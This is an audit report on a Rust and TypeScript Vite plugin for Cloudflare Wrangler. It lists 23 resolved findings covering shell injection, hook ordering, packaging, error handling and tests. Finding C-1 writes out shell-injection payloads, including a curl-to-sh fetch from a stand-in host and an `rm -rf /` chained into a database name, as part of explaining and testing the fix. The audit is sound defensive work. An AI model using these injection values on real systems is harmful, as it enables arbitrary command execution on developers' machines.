# Audit — `vite-plus-wrangler`

**Date:** 2026-08-04
**Version audited:** 0.1.0 (working tree, no VCS history)
**Scope:** correctness, Rust↔TS parity, security, build/packaging, tests, docs accuracy
**Method:** static review of all 6 `.rs` and 9 `.ts` files, config, fixtures, and docs. Neither `cargo` nor `node_modules` was available during the review pass, so every finding below is traceable to a specific line rather than to an observed failure.

**Status: all 23 findings resolved.** See [CHANGELOG.md](CHANGELOG.md) for the user-facing summary. Each finding below carries its resolution.

---

## Summary

| Severity | Count | Resolved |
| --- | --- | --- |
| 🔴 Critical | 2 | 2 |
| 🟠 High | 4 | 4 |
| 🟡 Medium | 9 | 9 |
| 🔵 Low | 8 | 8 |

The architecture is sound: a single Rust binary owns all parsing and filesystem work, the Node layer is genuinely thin, and the account guard fails closed in the case that matters most (config and env disagree). The problems clustered in three places — **shell command construction**, **the Vite plugin's hook ordering**, and **release packaging**.

### Verification after the fix pass

| Check | Result |
| --- | --- |
| `cargo test` | 36 passing (29 lib + 7 bin) |
| `cargo clippy --all-targets -- -D warnings` | clean |
| `cargo fmt --all -- --check` | clean |
| `tsc --noEmit` (strict + `noUncheckedIndexedAccess`) | clean |
| `vitest run` (unit) | 23 passing |
| `vitest run` (integration, real binary vs. fixtures) | 15 passing |

One finding was **introduced and caught during the fix pass**: the new port validation used a truthiness check, so `port: 0` skipped validation instead of being rejected — the same silent-default pattern the audit was fixing. Caught by `rejects a port that is not a real port`, fixed in `tasks.ts`.

A second was caught by the Rust suite: the new discovery precedence test asserted an insertion order that the sort does not produce. That one was a wrong test, not wrong code, and was corrected.

---

## 🔴 Critical

### C-1 — Shell injection in every generated task command

**Resolution:** All command construction moved to `src/shell.ts` (`quote`, `assertIdentifier`, `assertPort`, `join`, `wranglerFlags`). `tasks.ts` and `d1.ts` rewritten to use it. Regression tests cover `leads; rm -rf /`, `$(curl evil.sh)`, backticks, and paths with spaces.

**Files:** `src/d1.ts:17-54`, `src/tasks.ts:5-63`

Task commands are built by string interpolation with no quoting or escaping:

```ts
command: `wrangler d1 migrations apply ${database} --local${suffix}`   // d1.ts:38
command: `wrangler dev ${devFlags}`.trim()                             // tasks.ts:41
```

`database`, `env`, `config`, `migrationsDir`, `port`, `devArgs`, and `deployArgs` all flow in unescaped. In `discoverWranglerTasks` (`tasks.ts:96`) the `config` value is `found.path` — a path read off the filesystem, and `database`/`env` in a monorepo commonly come from a checked-in `wrangler.toml` rather than from the person typing the command.

Two distinct impacts:

1. **Injection.** A value containing `;`, `&&`, `$(...)`, or a backtick executes arbitrary commands when the task runner spawns a shell. `d1: "leads; curl evil.sh | sh"` is a working payload.
2. **Silent breakage on ordinary input.** A path with a space — `--config /Users/me/My Project/wrangler.toml` — splits into two arguments and wrangler receives garbage. This will happen to a real user long before an attacker shows up.

**Fix:** emit argv arrays rather than shell strings if `vp run` supports them; otherwise add a `shellQuote()` helper and apply it to every interpolated value. Also validate `database` and `env` against `^[A-Za-z0-9_-]+$` and reject rather than quote — those fields have no legitimate reason to contain shell metacharacters.

---

### C-2 — Real-looking Cloudflare account ID committed in a fixture

**Resolution:** Replaced with `0123456789abcdef0123456789abcdef` and a header comment marking the file as fixtures. A second placeholder account was added under `[env.staging]` to exercise per-environment overrides. No git history existed, so nothing needed rewriting.

**File:** `test/fixtures/basic-worker/wrangler.toml:3`

```toml
account_id = "cafa79bc67a5a702d959109cd442e39f"
```

That is 32 lowercase hex characters — exactly the shape of a live Cloudflare account ID, and unlike the `database_id` on line 9 it was not replaced with an obvious dummy (`00000000-0000-0000-0000-000000000000`). Every other value in the file is placeholder-shaped; this one is not.

An account ID is not a credential on its own, but it is an identifier you generally do not want in a public MIT-licensed repository — it is the first half of a targeted phishing or social-engineering attempt against the account, and it links this repo to your infrastructure.

**Fix:** confirm whether this is your real account ID. If so, replace it with an obvious dummy (`0123456789abcdef0123456789abcdef`) — and note that if this repo is ever pushed with history, replacing it in the working tree is not enough. If it is already a random value, make it look like one for the next reader.

---

## 🟠 High

### H-1 — `exposeVars` cannot work: the `config` hook runs before `configResolved`

**Resolution:** Discovery moved into the `config` hook via a memoized `scan()`; `configResolved` rescans only if the resolved root differs. Var keys are now validated against an identifier pattern before becoming `define` keys.

**File:** `src/plugin.ts:26-51`

`configs` is populated in `configResolved` (line 28), but `config()` (line 37) reads it via `primary()` (line 40). Vite's hook order is `config` → `configResolved` → everything else, so at the moment `config()` runs, `configs` is still the `[]` it was initialised to on line 17. `primary()` returns `undefined`, the hook returns early, and **no `define` entries are ever produced**.

The feature is documented in the README (line 155) and in `types.ts:90-94`, and it is 100% non-functional. There is no test covering it.

**Fix:** move discovery into the `config()` hook itself (it only needs `options.root ?? process.cwd()`, both available there) and have `configResolved` reconcile against the resolved root, or drop the option until it works.

---

### H-2 — npm package ships a single-platform binary

**Resolution:** Per-platform `@vite-plus-wrangler/*` packages declared as `optionalDependencies` and generated by `scripts/build-platform-packages.mjs`; `.github/workflows/release.yml` cross-compiles five targets and publishes platform packages before the main package. `scripts/postinstall.mjs` builds from source as a fallback and never fails the install. `rust.ts` resolves the platform package first.

**File:** `package.json:33` (`build`), `package.json:14-17` (`files`)

```
cargo build --release && tsdown ... && mkdir -p dist/bin && cp target/release/wrangler-rs* dist/bin/
```

`files` includes `dist`, so `dist/bin/wrangler-rs` goes into the tarball. Whatever platform you publish from is the only platform that works. Publishing from macOS arm64 means every Linux and Windows installer gets a binary they cannot execute; `getBinaryPath()` will find it (`fs.existsSync` passes), return it, and `spawnSync` fails with `EACCES`/`ENOEXEC` — which, per H-3, surfaces as a silent empty result rather than an error.

There is also no `postinstall` that would build from source as a fallback, and `cargo` is not declared as a requirement anywhere in `engines`.

**Fix:** the standard pattern is per-platform `optionalDependencies` (`@vite-plus-wrangler/darwin-arm64`, `linux-x64-gnu`, `win32-x64`, …) published from a CI matrix, with the main package resolving among them. Failing that, ship a `postinstall` that runs `cargo build --release` and errors loudly when cargo is absent.

### H-3 — Binary failures are swallowed; `runJson` ignores exit code, stderr, and spawn errors

**Resolution:** `run()` now inspects `error`, `signal`, `status`, and `stderr`, and returns a typed `WranglerEngineError`. `discoverConfigs`/`loadConfig` throw; `discoverConfigsSafe`/`loadConfigSafe` warn and degrade, and the plugin uses those. Parseable stdout still wins over a non-zero exit, since `account-check` and `migrations` exit 1 to report a finding.

**File:** `src/rust.ts:48-58`

```ts
const res = spawnSync(getBinaryPath(), [...args, "--json"], { encoding: "utf-8" });
if (res.stdout) { try { return JSON.parse(res.stdout.trim()) as T; } catch {} }
return fallback;
```

`res.error` (ENOENT — binary missing entirely), `res.status`, and `res.stderr` are all discarded. The Rust side writes its diagnostics to stderr (`main.rs:167`, `main.rs:182`), so a malformed `wrangler.toml` produces a precise error message that is thrown away, and `loadConfig` returns `null`. In `plugin.ts:84` that `null` is handled as `cfg?.d1_databases ?? []` — the migration check silently inspects nothing and the build passes.

`discoverConfigs` is the worst case: its fallback is `[]`, so a missing binary is indistinguishable from a repo with no Workers. `discoverWranglerTasks` then emits zero tasks with no warning.

**Fix:** surface `res.error` and non-zero `res.status` with `res.stderr` attached. At minimum `console.warn` before returning the fallback; better, add a `strict` variant that throws, and use it from `assertAccount`/`assertMigrations`.

### H-4 — `runWranglerRsCli` returns 0 when the binary fails to spawn

**Resolution:** `runWranglerRsCli` returns 1 on `res.error`, 1 on `res.signal`, and `res.status ?? 1` otherwise.

**File:** `src/rust.ts:108-109`, `src/cli.ts:5`

```ts
const res = spawnSync(getBinaryPath(), args, { stdio: "inherit" });
return res.status ?? 0;
```

`res.status` is `null` both when the process is killed by a signal (SIGSEGV, SIGKILL from an OOM killer) and when the spawn fails outright. Either way the CLI exits **0**. The README promises "Exit codes are non-zero on failure, so they drop straight into CI" (line 139) — in exactly the failure modes CI needs to catch, that promise does not hold, and `cf:deploy`'s account guard becomes a no-op that reports success.

**Fix:** `if (res.error) return 1; if (res.signal) return 1; return res.status ?? 1;`

---

## 🟡 Medium

### M-1 — Timestamp-prefixed migrations all collapse to index 0

**Resolution:** `Migration.index` is `u64`; a genuine parse failure pushes an explicit `Issue` instead of defaulting to 0. Gap detection now applies only to prefixes of six digits or fewer, since timestamps are never contiguous. Covered by `timestamp_prefixes_are_not_duplicates` and an integration test.

**File:** `src/migrations.rs:81`

```rust
let index = prefix.parse::<u32>().unwrap_or(0);
```

`u32::MAX` is 4,294,967,295. A timestamp prefix — `20240101120000_add_users.sql`, a widely used convention — does not fit, `parse` returns `Err`, and `unwrap_or(0)` silently assigns index 0. With more than one such file, the duplicate-prefix check (lines 113-123) reports every migration after the first as `Duplicate prefix ...` and `ok` goes false. The tool tells the user their perfectly valid migrations are broken, and the real cause (integer overflow) appears nowhere in the message.

**Fix:** parse to `u64`, and on genuine parse failure push an explicit `Issue` rather than defaulting to 0.

### M-2 — A non-existent `--env` silently resolves to the top-level config

**Resolution:** `for_env` returns `Result` and errors on an unknown environment, listing the declared ones. Verified end to end: `--env producton` exits 1 with `unknown environment 'producton'. Declared environments: default, dev, staging`.

**File:** `src/config.rs:79-81`

```rust
let Some(child) = self.env.get(env_name) else { return self.clone(); };
```

`--env production` against a config with no `[env.production]` returns the top-level config with no warning. For `cmd_config` that is merely confusing; for `cmd_account_check` (`main.rs:180`) it is a safety hole — the guard validates the *default* account and reports success, while the user believes they validated production. A typo in an environment name (`--env prod` vs `--env production`) produces a green check on the wrong target.

**Fix:** return `Result` and error on an unknown environment name, listing the ones that do exist. This is the one place in the codebase where failing open is genuinely dangerous.

### M-3 — Unauthenticated dev-server endpoint leaks account IDs and absolute paths

**Resolution:** Gated behind a new `devEndpoint` option (default false), with a `Host` allowlist blocking DNS rebinding and `account_id` redacted from the response.

**File:** `src/plugin.ts:53-60`

```ts
server.middlewares.use("/__wrangler/config", (_req, res) => {
  res.end(JSON.stringify({ root, configs }, null, 2));
});
```

`configs` contains `account_id` and the absolute `path` of every config in the repo. There is no auth, no `Host` header check, and no opt-in flag. Consequences:

- `vite --host` (routine on a laptop demoing to a phone) exposes every account ID on the LAN.
- No `Host` validation means a DNS-rebinding page in the user's browser can read this cross-origin while the dev server is running on localhost.

**Fix:** gate it behind an explicit option (default off), validate `Host` against localhost, and consider redacting `account_id` from the response.

### M-4 — `migrations_dir` is resolved against the wrong base

**Resolution:** New exported `resolveMigrationsDir(configPath, dir)` resolves against `path.dirname(configPath)`, matching Wrangler. Used by both the plugin and `d1Tasks`, so all three call sites now share one base.

**File:** `src/plugin.ts:90`

```ts
const report = checkMigrations(path.resolve(root, dir));
```

In Wrangler, `migrations_dir` is relative to the **wrangler config file**, not to the Vite root. In a monorepo where `workers/api/wrangler.toml` declares `migrations_dir = "migrations"`, this resolves to `<root>/migrations` instead of `<root>/workers/api/migrations`. The directory does not exist, `inspect` returns `ok: false` with "is not a directory" (`migrations.rs:47-57`), and `this.error` (line 94) **fails the build** on a correctly configured project.

Note that the same value gets a third base in `d1.ts:50`, where `d1:migrate:check` passes it raw and it resolves against the task's cwd.

**Fix:** resolve against `path.dirname(target.path)`, and use the same base in `d1Tasks`.

### M-5 — Task-name collisions silently overwrite in monorepo discovery

**Resolution:** `discoverWranglerTasks` tracks claimed prefixes and throws on a collision, naming both configs. The directory-derived fallback also strips the config extension.

**File:** `src/tasks.ts:95-100`

```ts
const name = found.worker_name ?? found.relative_path.replace(/[/\\]/g, "-");
tasks[`${name}#${task}`] = definition;
```

`worker_name` is not unique — two packages both named `api`, or a Worker whose name matches another's directory-derived fallback, produce identical keys and the second silently replaces the first. In a repo of 14 Workers, `vp run api#cf:deploy` deploys whichever one happened to sort last. Given the whole point of this project is not deploying the wrong thing, silent overwrite is the wrong behavior.

**Fix:** detect the collision and either disambiguate with the relative path or throw.

### M-6 — `cf:account` defaults to `wrangler.toml` regardless of the actual config

**Resolution:** New `resolveConfigPath()` probes `wrangler.toml` → `.jsonc` → `.json`, matching the engine's precedence order.

**File:** `src/tasks.ts:22-26`

`configPath` falls back to `"wrangler.toml"` when `options.config` is omitted. A project using `wrangler.jsonc` (which the README's own quick-start example uses, line 47) and calling `wranglerTasks({ d1: "..." })` without `config` gets an account check pointed at a file that does not exist — exit 1, and `cf:deploy` blocked with `wrangler.toml: No such file or directory` rather than anything actionable.

**Fix:** discover the config rather than assuming a filename, or require `config` explicitly.

### M-7 — Test coverage is thin and the fixtures are dead

**Resolution:** `test/engine.test.ts` runs the real binary against the fixtures (15 tests covering config parsing, env inheritance and override, unknown-env failure, discovery, account match/mismatch, migration hygiene, and argument handling). Two fixture directories added for timestamp and mixed-width prefixes. Rust suite grew from 5 to 36 tests. CI fails if the integration tests skip.

**Files:** `src/wrangler.test.ts`, `test/fixtures/**`

The 6 TypeScript tests only assert on generated command strings. Nothing covers `rust.ts` (binary resolution, JSON parsing, fallbacks), `plugin.ts` (every hook — including the broken H-1 path), `account.ts`, or `assertMigrations`.

`test/fixtures/basic-worker/` — a complete wrangler config with two migrations, clearly built to be an integration fixture — is **referenced by nothing**. `vite.config.ts:23` includes `test/**/*.test.ts`; no such file exists.

On the Rust side there are 5 tests total. `discovery.rs` has none. `migrations.rs` has one (`missing_dir_is_an_error`) and no coverage of prefix-width, duplicate, or gap detection — the module's entire reason for existing.

**Fix:** wire the fixture into an integration test that runs the built binary against `test/fixtures/basic-worker` and asserts on discovery, env resolution, and the migration report. Add Rust unit tests for each migration issue class.

### M-8 — `cf:types` caches on an absolute input path

**Resolution:** `discoverWranglerTasks` passes `relative_path` rather than the absolute `path`, and a test asserts no cache input starts with `/`.

**File:** `src/tasks.ts:61`, consumed via `tasks.ts:96`

`inputs: [configPath]`, and in `discoverWranglerTasks` that is `found.path` — an absolute path. Absolute paths in a task cache key do not survive a different checkout directory, a CI runner, or a teammate's machine, defeating the caching the README advertises as a headline feature (line 18).

**Fix:** store `relative_path` and pass relative config paths to `wranglerTasks`.

### M-9 — Two competing build definitions

**Resolution:** `vite.config.ts` is the single source of truth; `package.json` scripts delegate to `vp pack` and `vp check`. Added `typecheck`, `lint`, and `fmt` scripts, and `tsconfig.json` is now typecheck-only (`noEmit`) covering `src`, `test`, and `vite.config.ts`.

**File:** `package.json:33` vs `vite.config.ts:8-13`

`package.json` runs `tsdown src/index.ts src/cli.ts --dts` directly; `vite.config.ts` separately declares `pack.entry`, `format`, `dts`, and `clean`. Similarly `"check": "vp lint && vp fmt --check"` duplicates `check: { oxlint, oxfmt }`. Whichever one is not actually invoked will drift out of sync, and a reader cannot tell which is authoritative.

**Fix:** pick one. If `vp pack` is the real build, `package.json` should call it.

---

## 🔵 Low

| ID | File | Finding |
| --- | --- | --- |
| L-1 | `src/tasks.ts:88` | Uses bare `process.cwd()` without `import process from "node:process"` — the only file of the nine that does not import it. Works at runtime; inconsistent and lint-fragile. |
| L-2 | `src/rust.ts:45` | Falls back to bare `exeName`, so `spawnSync` resolves `wrangler-rs` from `PATH`. Combined with H-2 (missing binary is the common case), this can execute an unrelated binary. Prefer failing with a clear "binary not found" error. |
| L-3 | `src/rust.ts:36-38` | `getBinaryPath()` chmods the binary as a side effect of a *lookup* function, on every call. Move to install time. |
| L-4 | `src/main.rs:60-70` | `--env` / `--expect` / `--depth` as the final argument silently yield `None`; `--depth abc` silently becomes 6. Bad flag values should be errors, not defaults. |
| L-5 | `src/main.rs:70` + `discovery.rs:42` | `--depth 0` makes `WalkDir::max_depth(0)` visit only the root directory, so discovery always returns empty. Reject 0 or treat it as unlimited. |
| L-6 | `src/config.rs:96` | `for_env` inherits `compatibility_flags` whenever the child's list is empty, so an environment that deliberately sets `compatibility_flags = []` silently gets the parent's. Same pattern for the `d1_databases`/`kv_namespaces`/`r2_buckets` arrays. Distinguish "absent" from "explicitly empty" with `Option<Vec<_>>`. |
| L-7 | `src/discovery.rs:8,61` | A directory holding both `wrangler.toml` and `wrangler.json` yields two `DiscoveredConfig` entries with no precedence rule and no warning. Wrangler itself picks one. |
| L-8 | `src/d1.ts:17-22` vs `src/tasks.ts:5-10` | Two near-identical `flags`/`suffix` helpers that emit flags in opposite order (`--env --config` vs `--config --env`). Harmless today; a duplicated helper that has already diverged once will diverge again. |

### Low — resolutions

| ID | Resolution |
| --- | --- |
| L-1 | `import process from "node:process"` added; a grep check confirms all nine `.ts` files that touch `process` now import it. |
| L-2 | The `PATH` fallback is gone. `getBinaryPath()` throws a `WranglerEngineError` listing every location searched, the expected platform package, and how to build. |
| L-3 | Resolution is memoized and the chmod runs only on first resolve. `resetBinaryPathCache()` is exported for tests. |
| L-4 | `take_value()` errors when a flag's value is missing or is itself a flag; `--depth` errors on a non-numeric value. `parse_args` returns `Result` and usage errors exit 2. Seven unit tests cover the cases. |
| L-5 | `--depth` is validated to 1–64. Verified: `--depth 0` exits 2 with `--depth must be between 1 and 64`. |
| L-6 | List fields are `Option<Vec<_>>`, so an omitted key inherits and an explicit `[]` does not. A custom serializer keeps the JSON contract (`[]`, never `null`). Covered by `omitted_bindings_inherit_but_explicit_empty_does_not` and `empty_lists_serialize_as_arrays_not_null`. |
| L-7 | Precedence is `wrangler.toml` → `.jsonc` → `.json`; one directory now yields one entry, with the ignored siblings listed in a new `shadowed` field and warned about by the plugin. |
| L-8 | Both helpers replaced by `wranglerFlags()` in `src/shell.ts`, with a test pinning the flag order. |

---

## Project hygiene

Not code defects, but they affect whether this is publishable.

| Finding | Resolution |
| --- | --- |
| Not a git repository | `git init` plus a baseline commit of the pre-audit state, so the fixes land as a reviewable diff. |
| No `Cargo.lock` | Generated and committed, with a `.gitignore` comment explaining why it must stay committed. |
| No CI | `.github/workflows/ci.yml` runs fmt, clippy, and tests for Rust and Node across Linux, macOS, and Windows, and **fails if the integration tests skip**. `release.yml` handles the cross-compile and publish. |
| Missing community health files | `CHANGELOG.md`, `CONTRIBUTING.md`, and `SECURITY.md` added. `SECURITY.md` documents the command-construction rule and the account guard's limits. |
| Missing package metadata | `author`, `repository`, `homepage`, `bugs` added to `package.json`; `repository`, `homepage`, `readme`, `keywords`, `categories`, `rust-version`, `exclude` added to `Cargo.toml`. |
| `pnpm-workspace.yaml` had no `packages:` | Added `packages: []` with a comment explaining the file exists for `allowBuilds` and that `npm/*` is published directly by CI. |
| `tsconfig.json` excluded `test/` and `vite.config.ts` | Now typecheck-only (`noEmit`) covering `src`, `test`, and `vite.config.ts`, with `noUncheckedIndexedAccess` and other strictness added. Passes clean. |
| `.rs` and `.ts` share `src/` | **Left as-is.** Moving the crate would churn every path in the build, CI, and packaging scripts for a readability gain. Revisit if the file count grows. |

---

## Documentation accuracy

The README is unusually accurate for a 0.1.0 — the account-guard truth table matches `account.rs:36-79` exactly, case for case. Three corrections were needed:

| Finding | Resolution |
| --- | --- |
| `exposeVars` documented but non-functional | Fixed (H-1), so the docs are now true. |
| "Exit codes are non-zero on failure" was not reliable | Fixed (H-4). README now spells out the exit-code contract (0 success, 1 finding, 2 usage) and states that a guard which could not run never reports success. |
| `WRANGLER_RS_BIN` undocumented | Documented in a new environment-variable table, along with an "Installation internals" section covering the platform packages and the `postinstall` fallback. |

Also added: the `devEndpoint` option and its security rationale, the account guard's scope limits, timestamp-prefix support, and `migrations_dir` resolution semantics.

`skills/deploying-with-vite-plus-wrangler/SKILL.md` was consistent with the implementation and needed no changes. Its advice to match existing prefix width directly reflects `migrations.rs`.

---

## Remaining follow-ups

Nothing blocking, but worth knowing:

1. **The repository URL is a placeholder.** `package.json` and `Cargo.toml` assume `github.com/bhubbard/vite-plus-wrangler`. Update both if the repo lands elsewhere — the release workflow's provenance depends on it.
2. **`release.yml` needs an `NPM_TOKEN` secret** and the `@vite-plus-wrangler` npm scope to exist before the first tagged release.
3. **`optionalDependencies` are pinned to `0.1.0`.** They must be bumped in lockstep with the main package on every release; consider a version script so this cannot drift.
4. **No `pnpm-lock.yaml` is committed.** CI uses `--frozen-lockfile`, which will fail until one exists. Run `pnpm install` and commit the result.
5. **Windows shell quoting.** `quote()` targets POSIX shells. If `vp run` invokes `cmd.exe` natively on Windows, quoting rules differ — worth confirming against the task runner's actual behavior.
6. **The `d1:migrate:check` task assumes `vite-plus-wrangler` is on `PATH`**, which holds inside package scripts but not for a bare shell invocation.
